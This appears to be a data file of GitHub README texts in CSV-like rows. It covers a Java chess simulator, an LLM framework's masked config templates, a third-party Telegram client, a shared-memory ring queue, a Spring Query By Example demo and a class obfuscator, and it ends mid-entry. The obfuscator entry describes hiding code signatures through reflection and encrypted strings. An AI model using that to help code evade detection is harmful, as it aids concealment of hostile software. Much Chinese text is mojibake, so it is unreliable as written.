FactorTerm:D	6.0-->8.0	ChangeValue(ChangeRate):2.0(0.3333333333333333)	ContributionValue(ContributionRate):2.0(0.11764705882352941)	 ContributionProportion:0.4444444444444444
FactorTerm:E	5.0-->3.0	ChangeValue(ChangeRate):-2.0(-0.4)	ContributionValue(ContributionRate):-2.0(-0.11764705882352941)	 ContributionProportion:0.4444444444444444
Contribution Sum:-0.5(-0.02941176470588236)
```

# Participate in Contributions
[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=flat-square)](https://github.com/algorithm-tools/CausalAnalysis/pulls)

Welcome to join the community, build a win-win situation, please refer to the contribution processÔºö [How to contribute](https://github.com/algorithm-tools/CausalAnalysis/blob/main/docs/developer_guide/Contribution_Guide.md).

Thank you to all the people who already contributed to CausalAnalysis!

[![Contributors](https://contrib.rocks/image?repo=algorithm-tools/CausalAnalysis)](https://github.com/algorithm-tools/CausalAnalysis/graphs/contributors)


# Get Help

- Create an issue and describe it clearly.",0,0,1,Apache-2.0,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
Aenjieee/Chess-Rook-Movement-Simulator,feature/appdev,"# Chess Rook Movement Simulator
The **Chess Rook Movement Simulator** is an interactive application that simulates the behavior and movements of a rook chess piece on an 8x8 chessboard. Designed for learning and demonstration purposes, it includes visual feedback, sound effects, and basic collision detection. This application is built using Java Swing and Apache libraries in NetBeans IDE.

---

## Features

1. **Interactive Chessboard**
   - An 8x8 grid representing the chessboard.
   - Visual indicators for the rook's position and valid moves.

2. **Rook Movement Logic**
   - Horizontal and vertical movements based on chess rules.
   - Prevention of out-of-bounds and invalid moves.

3. **Sound Effects**
   - Feedback sounds for valid and invalid moves.
   - Customizable `.wav` files for events.

4. **User Controls**
   - Reset button to return the rook to its starting position.
   - Exit button to close the application.

5. **Extendability**
   - Can be adapted for other chess pieces or additional board sizes.

---

## Installation and Setup

1. **Prerequisites**
   - Java Development Kit (JDK) 11 or later.
   - NetBeans IDE installed.
   - Sound files (`valid.wav`, `invalid.wav`) placed in the project directory.

2. **Clone the Repository**
   ```bash
   git clone https://github.com/Aenjieee/chess-rook-simulator.git
   cd chess-rook-simulator
   ```

3. **Open in NetBeans**
   - Launch NetBeans IDE.
   - Open the project folder.

4. **Run the Application**
   - Build and run the project from NetBeans.
   - Ensure sound files are correctly linked.

---

## Usage Guide

1. **Start the Application**
   - Launch the program using the NetBeans ""Run"" button.

2. **Move the Rook**
   - Click on valid tiles to move the rook.
   - Invalid moves will trigger an error sound.

3. **Reset or Exit**
   - Use the reset button to restart.
   - Use the exit button to close the application.
",0,0,2,MIT,0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
AIDC-AI/ali-langengine,main,"**[‰∏≠ÊñáÁâàËØ¥Êòé](https://github.com/AIDC-AI/ali-langengine/blob/main/README_CN.md)**

**Alibaba langengine**

Alibaba langengine is a Java-based AI application development framework. It endows LLM with two core capabilities:

1. Data Awareness: Connecting language models with other data sources.

2. Agency Capability: Allowing language models to interact with engineering and systematic capabilities.

The main application scenarios of alibaba-langengine include personal assistants, document-based Q&A, chatbots, querying tabular data, code analysis, low-code application generation, etc.

**Related Code**

alibaba-langengine-core: The most essential AI application framework engine module.

alibaba-langengine-infrastructure: The infrastructure module of the AI application framework.

alibaba-langengine-community: Community open-source co-construction module.

alibaba-langengine-demo: Related example module.

**JDK version requirements**

JDK 8+

**Related Configuration**

alibaba-langengine-openai
```properties
openai_server_url=https://api.openai.com/
openai_api_key=******
openai_api_timeout=100
# compatible
OPENAI_API_KEY=******
```

alibaba-langengine-dashscope
```properties
# dashscope api
dashscope_server_url=https://dashscope.aliyuncs.com/
dashscope_api_key=******
dashscope_api_timeout=100
# compatible
DASH_SCOPE_API=******
```

alibaba-langengine-tool
```properties
# bing api
bing_server_url=https://api.bing.microsoft.com/
bing_api_key=******

# google api
google_customsearch_server_url=https://customsearch.googleapis.com/
google_api_key=******
google_cse_id=******

# serpapi api
serpapi_server_url=https://serpapi.com/
serpapi_key=******

# tavily api
tavily_api_key=******
```

alibaba-langengine-adbpg
```properties
# adbpg db
adbpg_datasource_endpoint=******
adbpg_datasource_databasename=******
adbpg_datasource_u=******
adbpg_datasource_p=******
```

alibaba-langengine-azure
```properties
# azure api
azure_openai_server_url=******
azure_deployment_name=******
azure_openai_api_version=******
azure_openai_api_timeout=100
```

alibaba-langengine-claude
```properties
# claude api
anthropic_server_url=https://api.anthropic.com/
anthropic_api_key=******
anthropic_api_timeout=120
```

alibaba-langengine-gemini
```properties
# gemini api
gemini_api_key=******
gemini_api_timeout=120
```

alibaba-langengine-hologres
```properties
# hologres db
hologres_datasource_endpoint=******
hologres_datasource_databasename=knowledge_center
hologres_datasource_u=******
hologres_datasource_p=******
```

alibaba-langengine-huggingface
```properties
# huggingface api
huggingface_api_key=******
```

alibaba-langengine-milvus
```properties
# milvus
milvus_server_url=******
```

alibaba-langengine-minimax
```properties
#minimax api
minimax_api_key=******
minimax_group_id=******
minimax_api_timeout=120
```

alibaba-langengine-moonshot
```properties
# moonshot api
moonshot_server_url=https://api.moonshot.cn
moonshot_api_key=******
moonshot_api_version=v1
moonshot_server_timeout=120
```

alibaba-langengine-msearch
```properties
#msearch api
msearch_api_key=******
msearch_api_timeout=120
```

alibaba-langengine-opensearch
```properties
# opensearch vector
opensearch_datasource_instance_id=ha-cn-*****
opensearch_datasource_endpoint=ha-cn-*****
opensearch_datasource_swift_server_root=http://*****
opensearch_datasource_swift_topic=ha-cn-******
```

alibaba-langengine-pinecone
```properties
# pinecone vector
pinecone_api_key=******
pinecone_environment=us-west4-gcp-free
pinecone_project_name=******
```

alibaba-langengine-polardb
```properties
# polardb postgres
polardb_datasource_endpoint=******
polardb_datasource_databasename=******
polardb_datasource_u=******
polardb_datasource_p=******
```

alibaba-langengine-redis
```properties
# redis
redis_host=r-******.redis.rds.aliyuncs.com
redis_port=6379
redis_p=******
redis_session_expire_second=60
```

alibaba-langengine-tair
```properties
# tair vector
tair_host=r-******.redis.rds.aliyuncs.com
tair_port=6379
tair_p=******
```

alibaba-langengine-vertexai
```properties
# vertexai
vertexai_server_url=https://us-central1-aiplatform.googleapis.com/
vertexai_api_key=******
vertexai_project_id=******
vertexai_api_timeout=120
```

alibaba-langengine-xingchen
```properties
# xingchen
xingchen_api_key=lm-******
xingchen_api_timeout=120
```

alibaba-langengine-xinghuo
```properties
# xinghuo
xinghuo_server_url=https://spark-api.xf-yun.com/v2.1/chat
xinghuo_app_id=******
xinghuo_api_key=******
xinghuo_api_secret=******
```

**License**

This project is licensed under Apache License Version 2 ([https://www.apache.org/licenses/LICENSE-2.0.txt](https://www.apache.org/licenses/LICENSE-2.0.txt), SPDX-License-identifier: Apache-2.0).",0,1,1,Apache-2.0,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,425.0
risin42/NagramX,dev,"# Nagram X

Make Nagram Great Again :)

## Download

You can grab the latest versions in these two ways:

*   **CI Channel:** [https://t.me/NagramX](https://t.me/NagramX)
*   **GitHub Actions Artifacts:**  You can also download artifacts from the [GitHub Actions](https://github.com/risin42/NagramX/actions/workflows/staging.yml) page

## NagramX Changes
- **Additional Features**
    - Save Deleted Messages
    - Save Edits History
    - AI Translator with customizable API endpoint and Model
    - Hide the Premium and Help sections in settings
    - Hide side share button
    - Hide bottom bar in channels
    - Avoids requesting camera permission when selecting images
    - Show Stickers row in main settings
    - Clear Cloud Settings data
    - Custom preferred languages in translation language selector
    - Text selection in restricted channels
    - Ask before sending bot command
    - Translate Entire Chats

- **Cleanup & Optimization**
    - Removed integrity checks ```jni/integrity```
    - Removed Sentry Analytics
    - Removed in-app updates
    - Removed payment functionality
    - Removed channel follow pop-ups
    - Refined N-Settings translations
    - Other minor optimizations and cleanup

- **Fixes**
    - Ripple effect for N-Settings
    - Google Maps
    - DeepL Translator
    - Disable auto download for exe and archive files
    - Other minor fixes

- **Default Settings Adjustments**
    - Enabled N-Settings hidden features
    - Disabled In-Chat sound
    - Disabled Dynamic Pack Order
    - Reverted font size and bubble radius to official Telegram defaults
    - Other minor adjustments

## Thanks to

- [AyuGram4A](https://github.com/AyuGram/AyuGram4A)
- [Dr4iv3rNope](https://github.com/Dr4iv3rNope/NotSoAndroidAyuGram)
- [OctoGram](https://github.com/OctoGramApp/OctoGram)

# Nagram

Nagram is a third-party Telegram client based on [NekoX](https://github.com/NekoX-Dev/NekoX) with some modifications.

- Official Site: <https://nextalone.xyz>
- Telegram Update Channel: <https://t.me/nagram_channel>
- Releases: <https://github.com/NextAlone/Nagram/releases>
- Issues here: <https://github.com/NextAlone/Nagram/issues>

## Additional feature over Nagram

1. Nice icon (thanks to MaitungTM)
2. Combine message
3. Editable text style 
4. Forced copy
5. Invert reply
6. Quick reply in longClick menu (thanks to @blxueya)
7. Undo and Redo
8. Scrollable chat preview (thanks to TeleTux)
9. Noise suppress and voice enhance (thanks to )

----

## NekoX Changes

- Most of Nekogram's features
- Unlimited login accounts
- **Proxy**
    - Built-in VMess, Shadowsocks, SSR, Trojan-GFW proxies support (No longer maintained)
    - Built-in public proxy (WebSocket relay via Cloudflare CDN), [documentation and for PC](https://github.com/arm64v8a/NekoXProxy)
    - Proxy subscription support
    - Ipv6 MTProxy support
    - Able to parse all proxy subscription format: SIP008, ssr, v2rayN, vmess1, shit ios app formats, clash config and more
    - Proxies import and export, remarks, speed measurement, sorting, delete unusable nodes, etc
    - Scan the QR code (any link, can add a proxy)
    - The ( vmess / vmess1 / ss / ssr / trojan ) proxy link in the message can be clicked
    - Allow auto-disabling proxy when VPN is enabled
    - Proxy automatic switcher
    - Don't alert ""Proxy unavailable"" for non-current account
- **Stickers**
    - Custom [Emoji packs](https://github.com/NekoX-Dev/NekoX/wiki/emoji)
    - Add stickers without sticker pack
    - Sticker set list backup / restore / share
- **Internationalization**
    - OpenCC Chinese Convert
    - Full InstantView translation support
    - Translation support for selected text on input and in messages
    - Google Cloud Translate / Yandex.Translate support
    - Force English emoji keywords to be loaded
    - Persian calendar support
- **Additional Options**
    - Option to disable vibration
    - Dialog sorting is optional ""Unread and can be prioritized for reminding"" etc
    - Option to skip ""regret within five seconds""
    - Option to not send comment first when forwarding
    - Option to use nekox chat input menu: replace record button with a menu which contains an switch to control link preview (enabled by default)
    - Option to disable link preview by default: to prevent the server from knowing that the link is shared through Telegram.
    - Option to ignore Android-only content restrictions (except for the Play Store version).
    - Custom cache directory (supports external storage)
    - Custom server (official, test DC)
    - Option to block others from starting a secret chat with you
    - Option to disable trending
- **Additional Actions**
    - Allow clicking on links in self profile
    - Delete all messages in group
    - Unblock all users support
    - Login via QR code
    - Scan and confirm the login QR code directly
    - Allow clearing app data
    - Proxies, groups, channels, sticker packs are able to be shared as QR codes
    - Add ""@Name"" when long-pressing @user option
    - Allow creating a group without inviting anyone
    - Allow upgrading a group to a supergroup
    - Mark dialogs as read using tab menu
    - Enabled set auto delete timer option for private chats and private groups
    - Support saving multiple selected messages to Saved Messages
    - Support unpinning multiple selected messages
    - View stats option for messages
- **Optimization**
    - Keep the original file name when downloading files
    - View the data center you belong to when you don't have an avatar
    - Enhanced notification service, optional version without Google Services
    - Improved session dialog
    - Improved link long click menu
    - Improved hide messages from blocked users feature
    - Don't process cleanup draft events after opening chat
- **Others**
    - OpenKeychain client (sign / verify / decrypt / import)
    - Text replacer
- **UI**
    - Telegram X style menu for unpinning messages
    - Built-in Material Design themes / Telegram X style icons
- And more :)

## API and Protocol documentation

Telegram API manuals: <https://core.telegram.org/api>

MTProto protocol manuals: <https://core.telegram.org/mtproto>

## Compilation Guide

**NOTE: For Windows users, please consider using a Linux VM (such as WSL2) or dual booting.**

Environment:

- Linux distribution based on Debian or Arch Linux, or macOS

- Native tools: `gcc` `go` `make` `cmake` `ninja` `yasm` `meson` `pkgconf`
  
  ```shell
  # for Debian based distribution
  sudo apt install gcc golang make cmake ninja-build yasm
  # for Arch Linux based distribution
  sudo pacman -S base-devel go ninja cmake yasm meson
  # for macOS
  xcode-select --install # install developer tools (will open confirm dialog)
  brew install go cmake ninja yasm meson pkgconf # install other tools by homebrew
  ```
- Android SDK: `build-tools;33.0.0` `platforms;android-33` `ndk;21.4.7075529` `cmake;3.18.1` `cmake;3.22.1` (the default location is **$HOME/Android/SDK**, otherwise you need to specify **$ANDROID_HOME** for it)

  It is recommended to use [Android Studio](https://developer.android.com/studio) to install, but you can also use `sdkmanager` command on distributions based on Debian:

  ```shell
  sudo apt install sdkmanager
  sdkmanager --sdk_root $HOME/Android/SDK --install ""build-tools;33.0.0"" ""platforms;android-33"" ""ndk;21.4.7075529"" ""cmake;3.18.1"" ""cmake;3.22.1""
  ```

Build: 

1. Checkout submodules

   ```shell
   git submodule update --init --recursive
   ```

2. Build native dependencies:
   ```shell
   ./run init libs
   ```

3. Build external libraries and native code: 
   ```shell
   ./run libs native
   ```

4. Fill out `TELEGRAM_APP_ID` and `TELEGRAM_APP_HASH` in **local.properties** (from [Telegram Developer](https://my.telegram.org/auth))

5. Replace **TMessagesProj/google-services.json** if you want FCM to work.

6. Replace **release.keystore** with yours and fill out `ALIAS_NAME`, `KEYSTORE_PASS` and `ALIAS_PASS` in **local.properties**.

7. Build with Gradle:

   ```shell
   ./gradlew assemble<Release/Debug>
   ```

----

## Compilation with GitHub Action

1. Create your own `release.keystore` to replace `TMessagesProj/release.keystore`.

2. Prepare LOCAL_PROPERTIES

- KEYSTORE_PASS: from your keystore
- ALIAS_NAME: from your keystore
- ALIAS_PASS: from your keystore
- TELEGRAM_APP_ID: from [Telegram Developer](https://my.telegram.org/auth)
- TELEGRAM_APP_HASH: from [Telegram Developer](https://my.telegram.org/auth)

```env
KEYSTORE_PASS=123456
ALIAS_NAME=key0
ALIAS_PASS=123456
TELEGRAM_APP_ID=123456
TELEGRAM_APP_HASH=abcdefg
```

Then, use base64 to encode the above.

3. Add Repo Action Secrets

- LOCAL_PROPERTIES: from step 2
- HELPER_BOT_TOKEN: from telegram [@Botfather](https://t.me/Botfather), such as `1111:abcd`
- HELPER_BOT_TARGET: from telegram chat id, such as `777000`

4. Run Release Build

## FAQ

#### What is the differences between Nagram, NekoX and Nekogram?

Developed by different developers, read the feature list above to understand the differences.

#### What is the noGcm version?

Google Cloud Messaging, also known as gcm / fcm, message push service by google used by original Telegram android app, it requires your device to have Google Service Framework (non-free) installed.

#### I've encountered a bug!

First, make sure you have the latest version installed (check the channel).

Then, if the issue appears in the official Telegram client too, please submit it to the officials, (be careful not to show NekoX in the description and screenshots, the official developers doesn't like us!).

Then, submit it to our [group](https://t.me/nagram_group) with #bug.

If you experience a *crash*, you also need to click on the version number at the bottom of the settings and select ""Enable Log"" and send it to us.

## Localization

Nagram is forked from Telegram, thus most locales follows the translations of Telegram for Android, checkout <https://translations.telegram.org/en/android/>.

Is Nagram not in your language, or the translation is incorrect or incomplete? Get involved in the translations on our [Weblate](https://xtaolabs.crowdin.com/nagram).

[![Crowdin](https://badges.crowdin.net/e/156df3a631d257cc6b57301566d545fb/localized.svg)](https://xtaolabs.crowdin.com/nagram)

## Thanks

- [NekoX](https://github.com/NekoX-Dev/NekoX)
- [Nekogram](https://gitlab.com/Nekogram/Nekogram)
- [Pigeongram](https://gitlab.com/JasonKhew96/Nekogram)
- [Nullgram](https://github.com/qwq233/Nullgram)
- [TeleTux](https://github.com/TeleTux/TeleTux)
- [OwlGram](https://github.com/OwlGramDev/OwlGram)

",0,2,4,GPL-3.0,4,6.0,1.0,19.0,1.0,22.0,0.0,-10.55,0.0
coralblocks/CoralRing,main,"# CoralRing

CoralRing is an ultra-low-latency, lock-free, garbage-free, batching and concurrent circular queue (_ring_)
in off-heap shared memory for inter-process communication (IPC) in Java across different JVMs using memory-mapped files.
It uses memory barriers through [volatile operations](https://github.com/coralblocks/CoralRing/blob/9d341629c330875c8c6d31559a670742c224e524/src/main/java/com/coralblocks/coralring/util/MemoryVolatileLong.java#L57) instead of locks to allow messages to be sent as fast as possible.

An interesting characteristic of _memory-mapped files_ is that `they allow your shared memory to exceed the size of your machine physical memory (RAM) by relying on the OS's virtual memory mechanism`. Therefore your shared memory is limited not by your RAM but by the size of your hard drive (HDD/SSD). The trade-off of a large memory-mapped file is performance as the OS needs to swap pages back and forth from hard drive to memory in a process called _paging_.

For maximum performance (lowest possible latency) you should place your memory-mapped file inside the Linux `/dev/shm/` folder so that the contents of your file are entirely kept in RAM memory. Of course by doing so you are back to being limited to your available RAM memory. CoralRing uses a _circular_ queue (_ring_) in shared memory so even with a small piece of memory you can transmit an unlimited number of messages to the other process.

For some performance numbers you can check [this link](https://www.coralblocks.com/index.php/inter-process-communication-with-coralqueue/).

<pre>
<b>Note:</b> CoralRing allows the exchange of messages <i>inside the same machine</i>.
For a multicast message middleware solution to build distributed systems across multiple
machines using the <i>sequencer architecture</i> you should refer to <a href=""https://www.coralblocks.com/index.php/state-of-the-art-distributed-systems-with-coralmq/"">this article</a>.
</pre>

## Waiting Ring

<img src=""images/WaitingRing.png"" alt=""WaitingRing"" width=""50%"" height=""50%"" />

Because the ring is a _bounded_ circular queue, the first approach is to have a _waiting_ producer and consumer. In other words, the ring producer will wait when the ring is full and the ring consumer will wait when the ring is empty. Basically a slow consumer will cause the producer to wait for space to become available in the ring. The consumer reads the messages (all the messages) in the same order that they were sent by the producer.

- Click [here](src/main/java/com/coralblocks/coralring/example/ring/minimal/MinimalWaitingRingProducer.java) for a minimal example of using a waiting ring producer
- Click [here](src/main/java/com/coralblocks/coralring/example/ring/minimal/MinimalWaitingRingConsumer.java) for a minimal example of using a waiting ring consumer
<br/><br/>
- Click [here](src/main/java/com/coralblocks/coralring/example/ring/BasicWaitingRingProducer.java) for a basic example of using a waiting ring producer
- Click [here](src/main/java/com/coralblocks/coralring/example/ring/BasicWaitingRingConsumer.java) for a basic example of using a waiting ring consumer

Note that for maximum performance the producer and consumer should busy spin when waiting, polling the ring. However you can also choose to use a _wait strategy_ from [CoralQueue](https://github.com/coralblocks/CoralQueue).

## Waiting Broadcast Ring

<img src=""images/WaitingBroadcastRing.png"" alt=""WaitingBroadcastRing"" width=""50%"" height=""50%"" />

You can also have a single producer broadcasting messages to multiple consumers so that `each consumer gets all the messages in the same order that they were sent by the producer`. Any slow consumer can cause the ring to get full and the producer to wait. As the slow consumer makes progress so will the producer.

- Click [here](src/main/java/com/coralblocks/coralring/example/ring/minimal/MinimalWaitingBroadcastRingProducer.java) for a minimal example of using a waiting broadcast ring producer
- Click [here](src/main/java/com/coralblocks/coralring/example/ring/minimal/MinimalWaitingBroadcastRingConsumer.java) for a minimal example of using a waiting broadcast ring consumer
<br/><br/>
- Click [here](src/main/java/com/coralblocks/coralring/example/ring/BasicWaitingBroadcastRingProducer.java) for a basic example of using a waiting broadcast ring producer
- Click [here](src/main/java/com/coralblocks/coralring/example/ring/BasicWaitingBroadcastRingConsumer.java) for a basic example of using a waiting broadcast ring consumer

## Non-Waiting Ring

<img src=""images/NonWaitingRing.png"" alt=""NonWaitingRing"" width=""50%"" height=""50%"" />

Things get more interesting when we allow the ring producer to write as fast as possible without ever waiting on a full ring. Because the ring is a _circular_ queue, the producer can just keep writing forever, overwriting the oldest messages on the head of the queue with the newest ones. In this new scenario, a _lagging consumer_ that falls behind and loses messages will simply disconnect (give up) _instead of causing the producer to wait_. It has to disconnect because it must never skip messages from the producer.
```Java
long avail = ringConsumer.availableToFetch();
			
if (avail == 0) continue; // busy spin as the ring is empty
			
if (avail == -1) throw new RuntimeException(""The consumer fell behind too much! (ring wrapped)"");
```

This lagging consumer problem can be mitigated by creating a large memory-mapped file so that your shared memory ring is big enough to give room for the consumer to fall behind and catch up. However there is a more important issue that we need to address with a non-waiting ring which is when the consumer falls behind so much that it hits the _edge_ of the circular ring. When that happens there is a _small chance_ that the consumer will be reading the oldest message in the ring at the same time that the producer is overwriting it with the newest message. In other words, the consumer can _trip over_ the producer.

### Using a _fall behind tolerance_

The _tripping over_ problem will _only_ happen when the consumer falls behind N messages, where N is equal to the capacity of the ring. If it falls behind a little more, it simply disconnects. If it falls behind a little less it _should_ still be able to read the next message without any issues. `So the bigger the capacity of the ring the less likely it is for the consumer to trip over the producer` because the more room it has to fall behind safely. Therefore, to reduce the chances for the consumer to get close to the edge, we can introduce a _fall behind tolerance_, in other words, `we can make the consumer give up and disconnect early when it falls to a percentage P of the capacity of the ring`.

The constructor of `NonWaitingRingConsumer` can take a _float_ argument `fallBehindTolerance` to specify the percentage of the ring capacity to fall behind before disconnecting. When it falls below that threshold then its `availableToFetch()` method returns `-1`.

Unfortantely, although this will further reduce the chances for the consumer to read a corrupt message, **it does not make it zero**. Theoretically, the slowness of the consumer is so _unpredictable_ that while it is reading a message there will always be a small chance that the producer is overwriting it. If we really want to eliminate this possibility completely we must use a _checksum_ for each message.

### Using a _checksum_ for each message

To completely solve the _corrupt message_ consumer problem, we can make the producer write a _checksum_ together with each message so that the consumer can check the integrity of the message after it reads it. Although we use a _fast_ hash algorithm ([_xxHash_](https://github.com/apache/drill/blob/master/exec/java-exec/src/main/java/org/apache/drill/exec/expr/fn/impl/XXHash.java) - https://xxhash.com/) to calculate the checksum, there is a small performance penalty to pay when you choose this approach.

The constructor of `NonWaitingRingProducer` can take a _boolean_ argument `writeChecksum` to tell the producer to write the _checksum_. The constructor of `NonWaitingRingConsumer` can take a _boolean_ argument `checkChecksum` to tell the consumer to check the _checksum_. The consumer can check for a _checksum error_ by checking for a `null` value returned from `fetch()`:
```Java
for(long i = 0; i < avail; i++) {
      
    MutableLong ml = ringConsumer.fetch();
      
    if (ml == null) {
        throw new RuntimeException(""The consumer tripped over the producer! (checksum failed)"");
    }
      
    // (...)
}
```

Note that when using the _checksum_ approach there is no reason to also use a _fall behind tolerance_. You can catch the exception, assume that the consumer has fallen behind too much and disconnect (give up).

### Using a _very large_ memory-mapped file

There is also another _simple_ approach to solve the _tripping over_ problem: `just allocate a very large memory-mapped file so that the producer never has to wrap around the ring`. For example, let's say you want to send _100 million_ messages per day, with a maximum size of _1024 bytes_. If you do the math you will see that this is _only_ 95 gigabytes of hard drive space. And as a bonus, as long as you don't go above your predicted maximum number of messages (no wrapping around the ring), you will also have all your messages persisted to disk at the end of your daily session. Then to begin a new session you can move the session file someplace else for archiving, reset the message sequence back to 1, and start over again.

- Click [here](src/main/java/com/coralblocks/coralring/example/ring/minimal/MinimalNonWaitingRingProducer.java) for a minimal example of using a non-waiting ring producer
- Click [here](src/main/java/com/coralblocks/coralring/example/ring/minimal/MinimalNonWaitingRingConsumer.java) for a minimal example of using a non-waiting ring consumer
<br/><br/>
- Click [here](src/main/java/com/coralblocks/coralring/example/ring/BasicNonWaitingRingProducer.java) for a basic example of using a non-waiting ring producer
- Click [here](src/main/java/com/coralblocks/coralring/example/ring/BasicNonWaitingRingConsumer.java) for a basic example of using a non-waiting ring consumer

## Non-Waiting Multicast Ring

A non-waiting ring can be used naturally to implement _multicast consumers_. That means that `you can have multiple non-waiting ring consumers reading from the same non-waiting ring producer`. All consumers will read all messages in the exact same order. A consumer can still fall behind and disconnect, but it will never miss a message or process a message out of order. It will also never make the producer wait as the producer does not even know how many consumers it is multicasting to. In other words, `consumers can leave and join the ring at any moment` without impacting the producer.

<img src=""images/NonWaitingMulticastRing.png"" alt=""NonWaitingMulticastRing"" width=""50%"" height=""50%"" />

## CoralQueue

CoralRing is great for threads running in different JVMs. But what about threads running inside the _same JVM_? For that you can check our [CoralQueue](https://github.com/coralblocks/CoralQueue) project which is a collection of circular data structures for inter-thread communication in Java.

<img src=""images/Queue.png"" alt=""CoralQueue"" width=""50%"" height=""50%"" />
",0,0,1,Apache-2.0,0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,30.0
danvega/qbe,main,"# Spring Data JPA Query By Example Demo

Transform your Spring Data JPA queries from complex boilerplate into elegant, type-safe search operations with [Query By Example](https://docs.spring.io/spring-data/jpa/reference/repositories/query-by-example.html). This project demonstrates how to implement dynamic, flexible queries without the overhead of writing multiple repository methods or complex JPQL statements.

## Overview

Query By Example (QBE) is a user-friendly querying technique that allows you to create dynamic queries using domain object instances as templates. This approach shines when building search functionality with multiple optional parameters, such as advanced search forms or dynamic filters.

## Project Requirements

- Java 23
- Spring Boot 3.3.5
- PostgreSQL
- Docker (for running the database)
- Maven

## Key Features

- Dynamic query generation using domain objects
- Type-safe query construction
- Minimal boilerplate code
- Integration with Spring Data JPA
- Docker-based development environment
- Comprehensive test coverage using TestContainers

## Getting Started

### Environment Setup

Ensure you have the following installed:
- Java 23 JDK
- Docker Desktop
- Maven

### Running the Application

1. Build and run the application:
```bash
./mvnw spring-boot:run
```

The application will be available at `http://localhost:8080`

## Understanding Query By Example

### Basic Example

Here's a simple example of how to use Query By Example:

```java
// Create a probe (example) entity
Employee probe = new Employee();
probe.setDepartment(""IT"");
probe.setPosition(""Developer"");

// Create the Example with the probe
Example<Employee> example = Example.of(probe);

// Find all matching employees
List<Employee> developers = employeeRepository.findAll(example);
```

### Advanced Usage

For more complex scenarios, you can customize the matching behavior:

```java
// Create a custom ExampleMatcher
ExampleMatcher matcher = ExampleMatcher.matching()
    .withIgnoreCase()
    .withStringMatcher(StringMatcher.CONTAINING);

Employee probe = new Employee();
probe.setDepartment(""eng"");  // Will match ""Engineering""

Example<Employee> example = Example.of(probe, matcher);
List<Employee> engineers = employeeRepository.findAll(example);
```

## When to Use Query By Example

QBE is ideal for:

- ‚úÖ Search forms with multiple optional filters
- ‚úÖ Quick prototyping and development
- ‚úÖ Simple equality-based queries
- ‚úÖ Scenarios where search criteria are unknown at compile time

Consider alternatives when you need:

- ‚ùå Complex comparisons (>, <, BETWEEN)
- ‚ùå OR conditions
- ‚ùå Complex JOIN operations
- ‚ùå Custom SQL functions

## Project Structure

```
src/
‚îú‚îÄ‚îÄ main/
‚îÇ   ‚îú‚îÄ‚îÄ java/
‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ dev/danvega/qbe/
‚îÇ   ‚îÇ       ‚îú‚îÄ‚îÄ model/
‚îÇ   ‚îÇ       ‚îú‚îÄ‚îÄ repository/
‚îÇ   ‚îÇ       ‚îî‚îÄ‚îÄ service/
‚îÇ   ‚îî‚îÄ‚îÄ resources/
‚îÇ       ‚îú‚îÄ‚îÄ application.yml
‚îÇ       ‚îî‚îÄ‚îÄ data.sql
‚îî‚îÄ‚îÄ test/
    ‚îî‚îÄ‚îÄ java/
        ‚îî‚îÄ‚îÄ dev/danvega/qbe/
```

## Configuration

The application's main configuration is in `application.yml`:

```yaml
spring:
  application:
    name: qbe
  jpa:
    show-sql: true
    hibernate:
      ddl-auto: create-drop
```

## Testing

The project uses TestContainers for integration testing, ensuring that tests run against a real PostgreSQL database:

```java
@SpringBootTest
@Testcontainers
class EmployeeRepositoryTest {

    @Container
    @ServiceConnection
    static PostgreSQLContainer<?> postgres = new PostgreSQLContainer<>(
            DockerImageName.parse(""postgres:16-alpine""));

    @Autowired
    private EmployeeRepository employeeRepository;
    
    // ...
}
```

## Learn More

- [Spring Data JPA Documentation](https://docs.spring.io/spring-data/jpa/reference/repositories/query-by-example.html)",0,0,1,,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,25.0
jar-analyzer/class-obf,master,"# class-obf

[CHANGE LOG](CHANGELOG.MD)

<img alt=""gitleaks badge"" src=""https://img.shields.io/badge/protected%20by-gitleaks-blue"">

![](https://img.shields.io/github/downloads/jar-analyzer/class-obf/total)
![](https://img.shields.io/github/v/release/jar-analyzer/class-obf)

![](https://github.com/jar-analyzer/class-obf/workflows/maven%20check/badge.svg)
![](https://github.com/jar-analyzer/class-obf/workflows/leak%20check/badge.svg)
![](https://github.com/jar-analyzer/class-obf/workflows/truffle%20check/badge.svg)

`class-obf` È°πÁõÆÂÖ®Áß∞ `Class Obfuscator` È°πÁõÆÔºå‰∏ìÈó®Áî®Êù•Ê∑∑Ê∑ÜÂçï‰∏™ `Class` Êñá‰ª∂

Á§∫‰æãÂõæÔºöÊ∑∑Ê∑ÜÂâç -> Ê∑∑Ê∑ÜÂêé

![](img/000.png)

ÂèØ‰ª•Ëá™ÂÆö‰πâ‰∏≠ÊñáÊ∑∑Ê∑ÜÂ≠óÁ¨¶Ôºå‰ª•ÂèäÊñπÊ≥ïÈöêËóèÁ≠âÊäÄÂ∑ß

![](img/004.png)

‰ªé `1.2.0` ÁâàÊú¨ÂºÄÂßãÊîØÊåÅÈõÜ‰∏≠ÊèêÂèñÂ≠óÁ¨¶‰∏≤Âêé `AES` Âä†ÂØÜËøêË°åÊó∂Ëß£ÂØÜ

![](img/007.png)

Êú¨È°πÁõÆÂ∑≤Ê∑±Â∫¶ÈõÜÊàêÂà∞ `web-chains` È°πÁõÆ‰∏≠ (https://github.com/Java-Chains/web-chains)

![](img/006.png)

‰ªé `1.4.0` ÁâàÊú¨ÂºÄÂßãÊîØÊåÅÂ∞Ü `INVOKE` Êåá‰ª§ËΩ¨‰∏∫ÂèçÂ∞ÑÁªìÂêàÂÖ∂‰ªñÊ∑∑Ê∑ÜÊñπÂºèÈöêËóèÁâπÂæÅ

![](img/008.png)

## ËÉåÊôØ

`jar-analyzer` Á≥ªÂàóÊõæÊúâ‰∏ÄÊ¨æÂ∑•ÂÖ∑ `jar-obfuscator` ÂÆûÁé∞ `jar` ÂåÖÁöÑÊ∑∑Ê∑Ü

ÈìæÊé•Ôºöhttps://github.com/jar-analyzer/jar-obfuscator

‰ΩÜÊòØËØ•Â∑•ÂÖ∑Êúâ‰ª•‰∏ãÈóÆÈ¢òÔºö

- ÈÖçÁΩÆÊñá‰ª∂ÈùûÂ∏∏Â§çÊùÇÔºå‰∏çÁÜüÊÇâÁöÑÊÉÖÂÜµ‰∏ãÈöæ‰ª•‰∏äÊâã‰ΩøÁî®
